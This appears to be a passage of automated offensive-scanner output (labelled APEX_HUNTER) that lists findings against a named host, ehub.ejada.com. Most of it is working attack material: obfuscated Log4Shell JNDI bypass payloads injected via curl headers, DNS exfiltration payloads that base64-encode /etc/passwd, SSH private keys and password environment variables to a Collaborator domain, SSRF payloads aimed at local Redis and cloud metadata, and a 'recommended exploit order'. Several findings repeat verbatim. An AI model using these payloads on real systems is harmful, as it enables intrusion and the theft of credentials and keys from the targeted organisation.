Generated 10 Log4Shell bypass payloads for 15 injection headers. Replace YOUR_OOB_DOMAIN with interactsh/Collaborator domain. Monitor for DNS callbacks confirming JNDI lookup execution.

**Evidence:**
```
  [1] ${jndi:ldap://basic.__HOST__.__OOB__/a}
  [2] ${${lower:j}ndi:${lower:l}dap://cve45046.__HOST__.__OOB__/a}
  [3] ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://obfs.__HOST__.__OO
  [4] ${${upper:j}ndi:${upper:l}dap://upper.__HOST__.__OOB__/a}
  [5] ${jndi:rmi://rmi.__HOST__.__OOB__/a}
  [6] ${jndi:iiop://iiop.__HOST__.__OOB__/a}
  [7] ${jndi:dns://dns.__HOST__.__OOB__/a}
  [8] ${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//nested.__HOST__.__
  [9] ${env:HOSTNAME}
  [10] ${spring:application.name}
```

**PoC:**
```bash
curl -sk 'https://ehub.ejada.com/' -H 'X-Api-Version: ${jndi:ldap://basic.ehub.ejada.com.YOUR_OOB_DOMAIN.burpcollaborator.net/a}'
curl -sk 'https://ehub.ejada.com/' -H 'X-Forwarded-For: ${jndi:ldap://basic.ehub.ejada.com.YOUR_OOB_DOMAIN.burpcollaborator.net/a}'
curl -sk 'https://ehub.ejada.com/' -H 'User-Agent: ${jndi:ldap://basic.ehub.ejada.com.YOUR_OOB_DOMAIN.burpcollaborator.net/a}'
curl -sk 'https://ehub.ejada.com/' -H 'Referer: ${jndi:ldap://basic.ehub.ejada.com.YOUR_OOB_DOMAIN.burpcollaborator.net/a}'
```

**Fix:** See CVE-2021-44228 mitigations. Monitor all injection points with interactsh. Use JNDI allow-list to block outbound LDAP/RMI/IIOP.

---

#### [INFO] DNS-EXFIL-CAPACITY-001: DNS Exfiltration — Channel Analysis & Payload Library
**CWE:** CWE-200 | **CVSS:** 0.0 | **Category:** DNS Exfiltration

DNS exfiltration channel capacity: ~189 chars/query via 3-label subdomain. Generated 6 OOB DNS exfil payloads. Use interactsh with DNS listener to capture exfiltrated data.

**Evidence:**
```
  [1] $($(cat /etc/passwd | base64 | tr -d '\n' | cut -c1-50)).exfil.ehub.ejada.com.YO
  [2] $($(id | base64)).exfil.ehub.ejada.com.YOUR_OOB_DOMAIN.burpcollaborator.net
  [3] $($(hostname | base64)).exfil.ehub.ejada.com.YOUR_OOB_DOMAIN.burpcollaborator.ne
  [4] $($(whoami | base64)).exfil.ehub.ejada.com.YOUR_OOB_DOMAIN.burpcollaborator.net
  [5] $($(env | grep -i pass | base64 | head -c 50)).exfil.ehub.ejada.com.YOUR_OOB_DOM
  [6] $($(cat ~/.ssh/id_rsa | base64 | cut -c1-50)).exfil.ehub.ejada.com.YOUR_OOB_DOMA
```

**PoC:**
```bash
# DNS exfil via curl:
curl -sk 'https://ehub.ejada.com/?host=$(id|base64).ehub.ejada.com.YOUR_OOB_DOMAIN.burpcollaborator.net'
# Listen with interactsh:
interactsh-client -server interactsh.com -n 1
```

**Fix:** Monitor DNS queries for anomalous subdomain patterns. Implement Response Policy Zones (RPZ). Apply DNS-over-HTTPS with filtering. Block outbound UDP 53 from application servers.

---

#### [INFO] LOG4SHELL2-OOB-PAYLOADS: Log4Shell Follow-On — All OOB Probe Payloads Generated
**CWE:** CWE-917 | **CVSS:** 0.0 | **Category:** Log4Shell / Java RCE

Generated 10 Log4Shell bypass payloads for 15 injection headers. Replace YOUR_OOB_DOMAIN with interactsh/Collaborator domain. Monitor for DNS callbacks confirming JNDI lookup execution.

**Evidence:**
```
  [1] ${jndi:ldap://basic.__HOST__.__OOB__/a}
  [2] ${${lower:j}ndi:${lower:l}dap://cve45046.__HOST__.__OOB__/a}
  [3] ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://obfs.__HOST__.__OO
  [4] ${${upper:j}ndi:${upper:l}dap://upper.__HOST__.__OOB__/a}
  [5] ${jndi:rmi://rmi.__HOST__.__OOB__/a}
  [6] ${jndi:iiop://iiop.__HOST__.__OOB__/a}
  [7] ${jndi:dns://dns.__HOST__.__OOB__/a}
  [8] ${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//nested.__HOST__.__
  [9] ${env:HOSTNAME}
  [10] ${spring:application.name}
```

**PoC:**
```bash
curl -sk 'https://ehub.ejada.com/' -H 'X-Api-Version: ${jndi:ldap://basic.ehub.ejada.com.YOUR_OOB_DOMAIN.burpcollaborator.net/a}'
curl -sk 'https://ehub.ejada.com/' -H 'X-Forwarded-For: ${jndi:ldap://basic.ehub.ejada.com.YOUR_OOB_DOMAIN.burpcollaborator.net/a}'
curl -sk 'https://ehub.ejada.com/' -H 'User-Agent: ${jndi:ldap://basic.ehub.ejada.com.YOUR_OOB_DOMAIN.burpcollaborator.net/a}'
curl -sk 'https://ehub.ejada.com/' -H 'Referer: ${jndi:ldap://basic.ehub.ejada.com.YOUR_OOB_DOMAIN.burpcollaborator.net/a}'
```

**Fix:** See CVE-2021-44228 mitigations. Monitor all injection points with interactsh. Use JNDI allow-list to block outbound LDAP/RMI/IIOP.

---

#### [INFO] SSRF-ADV-OOB-URL: SSRF Advanced OOB Payload — ?url
**CWE:** CWE-918 | **CVSS:** 0.0 | **Category:** SSRF

OOB SSRF test payload for parameter 'url'. Replace OOB domain.

**Evidence:**
```
  [file://] file%3A///etc/passwd
  [gopher://] gopher%3A//127.0.0.1%3A6379/_INFO%250A
  [dict://] dict%3A//127.0.0.1%3A6379/info
  [ldap://] ldap%3A//127.0.0.1%3A389/
  [sftp://] sftp%3A//127.0.0.1%3A22/
  [tftp://] tftp%3A//127.0.0.1%3A69/test
```

**PoC:**
```bash
curl -sk 'https://ehub.ejada.com/?url=http%3A//url.ehub.ejada.com.YOUR_OOB_DOMAIN.burpcollaborator.net/'
```

**Fix:** Monitor DNS callbacks for all OOB probes.

---

#### [INFO] SSRF-ADV-OOB-URL: SSRF Advanced OOB Payload — ?url
**CWE:** CWE-918 | **CVSS:** 0.0 | **Category:** SSRF

OOB SSRF test payload for parameter 'url'. Replace OOB domain.

**Evidence:**
```
  [file://] file%3A///etc/passwd
  [gopher://] gopher%3A//127.0.0.1%3A6379/_INFO%250A
  [dict://] dict%3A//127.0.0.1%3A6379/info
  [ldap://] ldap%3A//127.0.0.1%3A389/
  [sftp://] sftp%3A//127.0.0.1%3A22/
  [tftp://] tftp%3A//127.0.0.1%3A69/test
```

**PoC:**
```bash
curl -sk 'https://ehub.ejada.com/?url=http%3A//url.ehub.ejada.com.YOUR_OOB_DOMAIN.burpcollaborator.net/'
```

**Fix:** Monitor DNS callbacks for all OOB probes.

---

#### [INFO] SSRF-ADV-OOB-URL: SSRF Advanced OOB Payload — ?url
**CWE:** CWE-918 | **CVSS:** 0.0 | **Category:** SSRF

OOB SSRF test payload for parameter 'url'. Replace OOB domain.

**Evidence:**
```
  [file://] file%3A///etc/passwd
  [gopher://] gopher%3A//127.0.0.1%3A6379/_INFO%250A
  [dict://] dict%3A//127.0.0.1%3A6379/info
  [ldap://] ldap%3A//127.0.0.1%3A389/
  [sftp://] sftp%3A//127.0.0.1%3A22/
  [tftp://] tftp%3A//127.0.0.1%3A69/test
```

**PoC:**
```bash
curl -sk 'https://ehub.ejada.com/?url=http%3A//url.ehub.ejada.com.YOUR_OOB_DOMAIN.burpcollaborator.net/'
```

**Fix:** Monitor DNS callbacks for all OOB probes.

---

#### [INFO] SSRF-ADV-OOB-URL: SSRF Advanced OOB Payload — ?url
**CWE:** CWE-918 | **CVSS:** 0.0 | **Category:** SSRF

OOB SSRF test payload for parameter 'url'. Replace OOB domain.

**Evidence:**
```
  [file://] file%3A///etc/passwd
  [gopher://] gopher%3A//127.0.0.1%3A6379/_INFO%250A
  [dict://] dict%3A//127.0.0.1%3A6379/info
  [ldap://] ldap%3A//127.0.0.1%3A389/
  [sftp://] sftp%3A//127.0.0.1%3A22/
  [tftp://] tftp%3A//127.0.0.1%3A69/test
```

**PoC:**
```bash
curl -sk 'https://ehub.ejada.com/?url=http%3A//url.ehub.ejada.com.YOUR_OOB_DOMAIN.burpcollaborator.net/'
```

**Fix:** Monitor DNS callbacks for all OOB probes.

---

#### [INFO] RECON-SUBDOMAIN-BRUTE-001: Subdomain Brute — 1 new subdomains discovered
**CWE:** CWE-200 | **CVSS:** 0.0 | **Category:** Reconnaissance

DNS brute-force discovered 1 additional subdomains for ejada.com. Each represents additional attack surface.

**Evidence:**
```
  vpn.ejada.com → 88.85.230.136
```

**PoC:**
```bash
curl -sk 'https://vpn.ejada.com/'
```

**Fix:** Review each discovered subdomain for security posture. Remove unused subdomains. Apply consistent security headers and authentication across all subdomains.

---

#### [INFO] FINAL-CHAIN-REPORT-001: Final Attack Chain Report — 21C / 31H / 41M
**CWE:** CWE-693 | **CVSS:** 0.0 | **Category:** Report

═══ APEX_HUNTER FINAL REPORT — ehub.ejada.com ═══
Scan date    : 2026-06-01 02:23
Total findings: 112
Risk breakdown: CRITICAL=21 | HIGH=31 | MEDIUM=41 | LOW=0 | INFO=19

TOP CRITICAL FINDINGS:
  [FULL-CHAIN-POC] Full chain PoC — 5 findings chained, 2 attack combos identified (CVSS 10.0)
    PoC: curl -sI 'https://ehub.ejada.com/'
curl -sI 'https://ehub.ejada.com/' | grep -i 
  [ADV-EXPLOIT-CHAIN] Advanced exploit chain: SSRF → Cloud Metadata → IAM Key Exfiltration → Full AWS Takeover (CVSS 10.0)
    PoC: Step 1: curl -sI 'https://ehub.ejada.com/'
curl -sI 'https://ehub.ejada.com/' | 
  [AZURE-IMDS-V1-METADATA-URL] SSRF → Azure IMDS v1-metadata Chain via ?url (CVSS 9.9)
    PoC: # Step 1 — Verify SSRF via OOB:
curl -sk 'https://ehub.ejada.com?url=http://YOUR
  [AZURE-IMDS-V1-IDENTITY-URL] SSRF → Azure IMDS v1-identity Chain via ?url (CVSS 9.9)
    PoC: # Step 1 — Verify SSRF via OOB:
curl -sk 'https://ehub.ejada.com?url=http://YOUR
  [AZURE-IMDS-V1-SUBSCRIPTIO-URL] SSRF → Azure IMDS v1-subscription Chain via ?url (CVSS 9.9)
    PoC: # Step 1 — Verify SSRF via OOB:
curl -sk 'https://ehub.ejada.com?url=http://YOUR
  [AZURE-IMDS-V2-IDENTITY-URL] SSRF → Azure IMDS v2-identity Chain via ?url (CVSS 9.9)
    PoC: # Step 1 — Verify SSRF via OOB:
curl -sk 'https://ehub.ejada.com?url=http://YOUR
  [AWS-IMDS-V1-CREDS] SSRF → AWS IMDS v1-creds — IAM Credential Theft Chain (CVSS 9.9)
    PoC: # IMDSv1 (no token required):
curl -sk 'https://ehub.ejada.com?url=http%3A//169.
  [AWS-IMDS-V1-ROLE] SSRF → AWS IMDS v1-role — IAM Credential Theft Chain (CVSS 9.9)
    PoC: # IMDSv1 (no token required):
curl -sk 'https://ehub.ejada.com?url=http%3A//169.

TOP HIGH FINDINGS:
  [F-HDR-001] Critical Security Headers Missing (CVSS 5.4)
  [CHAIN-JENKINS-RCE] [EXPLOIT CHAIN] Jenkins Groovy RCE → Lateral Movement (CVSS 10.0)
  [CHAIN-LFI-RCE] [EXPLOIT CHAIN] LFI → Log Poison → RCE (CVSS 9.8)
  [CHAIN-AUTH-BYPASS-ADMIN] [EXPLOIT CHAIN] Auth Bypass → Admin Takeover → Data Exfil (CVSS 9.6)
  [CHAIN-SUPPLY-CHAIN-SAST] [EXPLOIT CHAIN] Supply Chain → Internal Package Confusion → RCE (CVSS 9.3)

ATTACK CATEGORIES:
  Information Disclosure                    26 finding(s)
  Auth / Credential Stuffing                22 finding(s)
  SSRF → Cloud Pivot                        11 finding(s)
  SSRF                                       7 finding(s)
  Subdomain Takeover                         7 finding(s)
  Exploit Chain                              7 finding(s)
  GraphQL                                    4 finding(s)
  Lateral Movement                           4 finding(s)
  Rate Limiting                              4 finding(s)
  Risk Scorecard                             3 finding(s)

RECOMMENDED EXPLOIT ORDER:
  1. All CRITICAL findings — immediate RCE/takeover risk
  2. Injection chains (SQLi→dump, CMDi→shell, SSTI→RCE)
  3. Cloud pivot chains (SSRF→IMDS→IAM creds)
  4. Authentication bypasses (JWT, BFLA, session fixation)
  5. Sensitive file exposure (env, keys, configs)

REMEDIATION PRIORITY:
  P1 (24h): All CRITICAL — active exploitation risk
  P2 (7d):  All HIGH — significant security impact
  P3 (30d): All MEDIUM — defence in depth
  P4 (90d): All LOW/INFO — hardening

**Evidence:**
```
Total: 112 findings across 23 categories
```

**PoC:**
```bash
# See individual finding PoC commands in JSON/HTML report
```

**Fix:** Remediate all CRITICAL and HIGH findings before next assessment cycle.

---
